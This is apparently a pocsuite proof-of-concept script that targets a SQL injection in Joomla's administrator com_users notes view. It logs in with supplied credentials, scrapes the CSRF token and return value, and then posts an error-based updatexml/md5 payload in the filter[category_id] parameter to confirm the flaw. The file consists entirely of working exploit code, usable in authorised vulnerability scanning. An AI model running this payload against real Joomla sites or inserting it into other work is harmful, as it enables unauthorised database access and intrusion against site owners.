#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import hashlib
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.lib.core.data import logger
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.utils import randomStr
from pocsuite.lib.core.enums import CUSTOM_LOGGING
from urlparse import urljoin


class TestPOC(POCBase):
    vulID = ''
    version = ''
    author = 'luckybool1020'

    def get_pass(self, joomla_session):
        if any(para not in self.params for para in ['user', 'passwd']):
            logger.log(
                CUSTOM_LOGGING.SYSINFO,
                "You can use --extra-params=\"{'user': 'xxx','passwd': 'xxx'}\" to exec command")
            return self.parse_output(None)
        else:
            user, passwd = self.params['user'], self.params['passwd']
        url = urljoin(self.url, '/administrator/index.php')
        content = joomla_session.get(url).content
        re_para = '<input type="hidden" name="return" value="(.*?)"/>.*<input type="hidden" name="(.*?)" value="1" />'
        match = re.findall(re_para, content, re.S)
        if match:
            value, token = match[0][0], match[0][1]
        else:
            return self.parse_output(None)
        self.headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        pass_payload = 'username={user}&passwd={passwd}&option=com_login&task=login&return={value}&{token}=1'.format(
            user=user, passwd=passwd, value=value, token=token)
        joomla_session.post(
            url=url, params=None, headers=self.headers, data=pass_payload)

    def _verify(self):
        '''verify mode'''
        result = {}
        joomla_session = req.session()
        self.get_pass(joomla_session)
        rand_str = randomStr(10, "0123456789")
        url = urljoin(self.url, '/administrator/index.php?option=com_users&view=notes')
        sqli_payload = 'filter[search]=&list[fullordering]=a.review_time DESC&list[limit]=20&filter[published]=1&filter[category_id]=(updatexml(2,concat(0x7e,(md5({randstr}))),0))'.format(
            randstr=rand_str)
        r = joomla_session.post(url=url, headers=self.headers, data=sqli_payload)
        if r.status_code == 500 and hashlib.md5(rand_str).hexdigest()[
                0:31] in r.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
